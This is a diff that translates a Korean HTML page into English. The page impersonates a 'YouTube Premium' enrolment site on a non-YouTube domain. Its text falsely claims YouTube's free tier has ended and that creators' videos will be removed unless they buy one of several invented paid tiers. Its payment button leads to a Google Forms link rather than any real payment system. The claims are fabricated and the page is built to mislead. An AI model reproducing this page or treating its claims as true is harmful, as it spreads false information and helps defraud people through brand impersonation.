@@ -10,22 +10,22 @@
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
     <meta name="language" content="Korean">
     <!-- Primary Meta Tag -->
-<title>2021년 12월부터 적용되는 새로운 YouTube 유료화 정책 - YouTube Premium</title>
-<meta name="title" content="2021년 12월부터 적용되는 새로운 YouTube 유료화 정책 - YouTube Premium">
-<meta name="description" content="YouTube Premium을 통해 구독자로부터 수익을 창출하고 수많은 컨텐츠를 시청할 수 있습니다.">
+<title>New YouTube Monetization Policy Effective December 2021 - YouTube Premium</title>
+<meta name="title" content="New YouTube Monetization Policy Effective December 2021 - YouTube Premium">
+<meta name="description" content="YouTube Premium allows you to monetize your subscribers and watch tons of content.">
 
 <!-- Open Graph / Facebook -->
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://youtubepremiumenroll.pcor.me/">
-<meta property="og:title" content="2021년 12월부터 적용되는 새로운 YouTube 유료화 정책 - YouTube Premium">
-<meta property="og:description" content="YouTube Premium을 통해 구독자로부터 수익을 창출하고 수많은 컨텐츠를 시청할 수 있습니다.">
+<meta property="og:title" content="New YouTube Monetization Policy Effective December 2021 - YouTube Premium">
+<meta property="og:description" content="YouTube Premium allows you to monetize your subscribers and watch tons of content.">
 <meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png">
 
 <!-- Twitter -->
 <meta property="twitter:card" content="summary_large_image">
 <meta property="twitter:url" content="https://youtubepremiumenroll.pcor.me/">
-<meta property="twitter:title" content="2021년 12월부터 적용되는 새로운 YouTube 유료화 정책 - YouTube Premium">
-<meta property="twitter:description" content="YouTube Premium을 통해 구독자로부터 수익을 창출하고 수많은 컨텐츠를 시청할 수 있습니다.">
+<meta property="twitter:title" content="New YouTube Monetization Policy Effective December 2021 - YouTube Premium">
+<meta property="twitter:description" content="YouTube Premium allows you to monetize your subscribers and watch tons of content.">
 <meta property="twitter:image" content="https://www.youtube.com/img/desktop/yt_1200.png">
     <script src="https://code.jquery.com/jquery-3.6.0.slim.min.js" integrity="sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=" crossorigin="anonymous"></script>
     <script src="unified-ui.js"></script> 
@@ -53,23 +53,23 @@
        <center>
       <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/YouTube_Logo_2017.svg/1920px-YouTube_Logo_2017.svg.png" class="h-6" alt="로고">
 </center><br>
-        YouTube의 프리 티어는<br>
-        더 이상 사용할 수 없습니다.
+        YouTube's Free Tier<br>
+        Is no longer available.
       </h1>
       <p class="font-normal text-gray-500">
-        지난 2021년 1월, YouTube의 무료 에디션 지원이 2021년 12월에 종료될 것이라고 공지했습니다.<br>
+        In January 2021, we announced that YouTube's free tier support would end in December 2021.<br>
         
       </p>
       <p class="text-sm font-normal text-gray-400">
-        수준 높은 크리에이터들로 이뤄진  안전한 커뮤니티를 만들기 위한 YouTube의 노력의 일환으로, 무료 사용자의 YouTube 지원을 종료하였으며, 2022년 6월부터 Premium에 등록되지 않은 크리에이터의 영상은 제거될 예정입니다.<br>
+        As part of YouTube's efforts to create a safe community of high-quality creators, we are ending support for YouTube for free users, and starting in June 2022, videos from creators not enrolled in Premium will be removed.<br>
         <br>
-        기존 데이터는 상단의 "로그인"을 눌러 Vimeo, Facebook Live로 이전할 수 있습니다.
+        Existing data can be transferred to Vimeo, Facebook Live by pressing "Sign In" at the top.
       </p>
     </div>
 
     <!-- Plan switch -->
     <div class="flex items-center justify-center mt-10 space-x-4">
-      <span class="text-base font-medium">매월</span>
+      <span class="text-base font-medium">MONTHLY</span>
       <button
               class="relative rounded-full focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500"
               x-cloak
@@ -81,7 +81,7 @@
              :class="{ 'translate-x-0': billPlan == 'monthly', 'translate-x-8': billPlan == 'annually' }"
              ></div>
       </button>
-      <span class="text-base font-medium">매년 <span class="ml-2 rounded-full px-2 bg-red-500 text-white">25% 절약</span></span>
+      <span class="text-base font-medium">YEARLY <span class="ml-2 rounded-full px-2 bg-red-500 text-white">SAVE 25%</span></span>
     </div>
 
     <!-- Plans -->
@@ -95,9 +95,9 @@
             <span
                   class="text-4xl font-medium tracking-tight"
                   :class="plan.name == 'Duo' ? 'font-bold' : ''"
-                  x-text="`₩${billPlan == 'monthly' ? plan.price.monthly : plan.price.annually}`"
+                  x-text="`$${billPlan == 'monthly' ? plan.price.monthly : plan.price.annually}`"
                   ></span>
-            <span class="text-gray-400" x-text="billPlan == 'monthly' ? '/개월' : '/년'"></span>
+            <span class="text-gray-400" x-text="billPlan == 'monthly' ? '/MONTH' : '/YEAR'"></span>
           </div>
 
           <!--  -->
@@ -133,7 +133,7 @@
             <button onclick="openModal('main-modal')"
                     class="inline-flex items-center justify-center w-full max-w-xs px-4 py-2 transition-colors border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
                     :class="plan.name == 'Duo' ? 'bg-blue-500 text-white hover:bg-blue-700' : 'hover:bg-blue-500 hover:text-white'"
-                    x-text="`${plan.name} 요금제 선택`"
+                    x-text="`SELECT ${plan.name} TIER`"
                     ></button>
           </div>
         </section>
@@ -141,10 +141,10 @@
     </div>
   </main>
   <div class="text-center py-2 bg-white">
-    비영리 단체이거나 교육자이신가요?<span class="text-blue-500 ml-1">비영리 단체를 위한 Premium에 대해 자세히 알아보기</span>.
+    Educator or Nonprofit organization?<span class="text-blue-500 ml-1">Learn more about free nonprofit premium</span>.
 </div>
 <div class="text-center py-2 bg-white">
-    이전 YouTube Premium 사용자는 평생 Duo를<span class="text-blue-500 ml-1">이용하실 수 있습니다</span>.
+    Previous YouTube Premium user can get lifetime license of Duo from<span class="text-blue-500 ml-1">here</span>.
 </div>
 </div>
         <!-- UHF Footer from Microsoft -->
@@ -155,7 +155,7 @@
         <div class="modal-content py-4 text-left px-6">
             <!--Title-->
             <div class="flex justify-between items-center pb-3">
-                <p class="text-2xl font-bold text-gray-500">구매</p>
+                <p class="text-2xl font-bold text-gray-500">PAY</p>
                 <div class="modal-close cursor-pointer z-50" onclick="modalClose('main-modal')">
                     <svg class="fill-current text-gray-500" xmlns="http://www.w3.org/2000/svg" width="18" height="18"
                         viewBox="0 0 18 18">
@@ -166,8 +166,8 @@
                 </div>
             </div>
             <!--Body-->
-            <a title="Google Pay로 결제" class="my-5 mr-5 ml-5 py-2 flex justify-center shadow-md border" href="https://docs.google.com/forms/d/e/1FAIpQLSdWUB2bXKtSzv_PXY8xKbaEiiFdiezS2772Ak1Ke2RATF1cNA/viewform?usp=sf_link">
-            <img src="https://lh6.ggpht.com/nVNMtbG6Zewvf4an92lJeT75uTDh2LV85Crj5dXOmf3f5tDSqFyC-H0iA4hDXm9stabGSCE" class="h-6" class="Google Pay">로 결제
+            <a title="Google Pay" class="my-5 mr-5 ml-5 py-2 flex justify-center shadow-md border" href="https://docs.google.com/forms/d/e/1FAIpQLSdWUB2bXKtSzv_PXY8xKbaEiiFdiezS2772Ak1Ke2RATF1cNA/viewform?usp=sf_link">
+           PAY VIA <img src="https://lh6.ggpht.com/nVNMtbG6Zewvf4an92lJeT75uTDh2LV85Crj5dXOmf3f5tDSqFyC-H0iA4hDXm9stabGSCE" class="h-6 ml-1" class="Google Pay">
             </a>
             
         </div>
@@ -208,30 +208,30 @@
         plans: [
         {
             name: 'Basic',
-            discretion: 'YouTube의 기본적인 기능을 이용할 수 있습니다.',
+            discretion: 'You can use the basic features of YouTube.',
             price: {
-            monthly: 9500,
-            annually: 9500 * 12 - 28500,
+            monthly: 9.5,
+            annually: 9.5 * 12 - 28.5,
             },
-            features: ['광고 없는 영상 시청', '720p 스트리밍', '최대 3개의 기기에서 동시 시청'],
+            features: ['Ad-free experience', 'Max 720p', 'Simultaneous viewing on up to 3 devices'],
         },
         {
             name: 'Duo',
-            discretion: '영상을 제작하고, 더 많은 시청자와 소통',
+            discretion: 'Create videos and connect with more viewers.',
             price: {
-            monthly: 12800,
-            annually: 12800 * 12 - 38400,
+            monthly: 12.8,
+            annually: 12.8 * 12 - 38.4,
             },
-            features: ['Basic의 기능 전부', '1080p60 스트리밍', '오프라인 저장', '100GB 동영상 업로드', '백그라운드 재생'],
+            features: ['All Basic Features', 'Max 1080p60', 'Offline save', '100GB video upload', 'Background playback'],
         },
         {
             name: 'Max',
-            discretion: 'YouTube의 모든 기능을 사용',
+            discretion: 'Use all the features of YouTube.',
             price: {
-            monthly: 24000,
-            annually: 24000 * 12 - 72000,
+            monthly: 24,
+            annually: 24 * 12 - 72,
             },
-            features: ['Duo의 기능 전부', '2560p120 스트리밍', '15TB 동영상 업로드', '1:1 채팅 지원'],
+            features: ['All Duo Features', 'Max 2560p120', '15TB video upload', '1:1 chat support'],
         },
         ],
     }
